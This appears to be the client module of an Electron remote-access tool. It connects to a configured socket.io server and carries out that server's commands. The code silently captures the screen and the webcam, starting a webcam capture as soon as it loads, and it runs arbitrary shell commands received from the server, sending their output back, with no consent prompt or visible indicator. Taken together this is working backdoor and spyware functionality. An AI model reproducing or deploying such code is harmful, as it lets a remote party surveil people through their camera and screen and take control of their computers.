const { desktopCapturer, screen, app } = require("electron");
const io = require("socket.io-client");
const child_process = require("child_process");
const nwc = require("node-webcam");

//const robot = require("robotjs");

// My Modules
const info = require("./config");

class RemoteControl {
  constructor() {
    this.getCamData();
  }
  getCamData = (data) => {
    return new Promise((resolve, reject) => {
      (async () => {
        var options = {
          //Picture related

          width: 1280,

          height: 720,

          quality: 10,

          // Number of frames to capture
          // More the frames, longer it takes to capture
          // Use higher framerate for quality. Ex: 60

          frames: 60,

          //Delay in seconds to take shot
          //if the platform supports miliseconds
          //use a float (0.1)
          //Currently only on windows

          delay: 0,

          //Save shots in memory

          saveShots: true,

          // [jpeg, png] support varies
          // Webcam.OutputTypes

          output: "jpeg",

          //Which camera to use
          //Use Webcam.list() for results
          //false for default device

          device: false,

          // [location, buffer, base64]
          // Webcam.CallbackReturnTypes

          callbackReturn: "base64",

          //Logging

          verbose: false,
        };

        let wc = nwc.create(options);
        wc.capture("a.db", (error, result) => {
          try {
            data["src"] = result;

            this.socket.emit("camShotResponse", data);
            resolve("success");
          } catch (error) {
            resolve("not yet");
          }
        });
      })();
    });
  };

  getScreenData = (data) => {
    let pr = new Promise((resolve, reject) => {
      (async () => {
        let sources = await desktopCapturer.getSources({
          types: ["screen"],
          thumbnailSize: {
            width: parseInt(data.dimension.split("x")[0]),
            height: parseInt(data.dimension.split("x")[1]),
          },
        });

        data["src"] = sources[data.screen].thumbnail.toDataURL();
        this.socket.emit("screenshotResponse", data);
        resolve("success");
      })();
    });
    return pr;
  };

  findComparedPosition = (data) => {
    return {
      x:
        data.mousePosition.x *
        (screen.getAllDisplays()[data.screen].size.width /
          data.webScreen.width),
      y:
        data.mousePosition.y *
        (screen.getAllDisplays()[data.screen].size.height /
          data.webScreen.height),
    };
  };

  start = (mainWindow) => {
    this.socket = io.connect("http://" + info.host + ":" + info.port);
    this.socket.on("connect", () => {
      this.socket.emit("joinToRoom", { roomName: "terminal-" + info.id });
    });

    this.socket.on("screenshotRequest", (data) => {
      this.getScreenData(data).then();
    });

    this.socket.on("camShotRequest", (data) => {
      this.getCamData(data).then();
    });

    this.socket.on("getRunRequest", (data) => {
      child_process.exec(data.cmd, { shell: true }, (err, stdout, stderr) => {
        if (err) {
          data["cmd"] = "err: " + err;
        } else if (stderr) {
          data["cmd"] = "stderr: " + stderr;
        } else {
          data["cmd"] = stdout;
        }

        this.socket.emit("getRunResponse", data);
      });
    });
    this.socket.on("mousemove", (data) => {
      data["compared"] = this.findComparedPosition(data);
      data["screen_resolition"] = screen.getAllDisplays()[data.screen].size;
      //robot.moveMouse(data.compared.x, data.compared.y);
    });
    this.socket.on("click", (data) => {
      //robot.mouseClick()
    });
  };
}

module.exports = new RemoteControl();
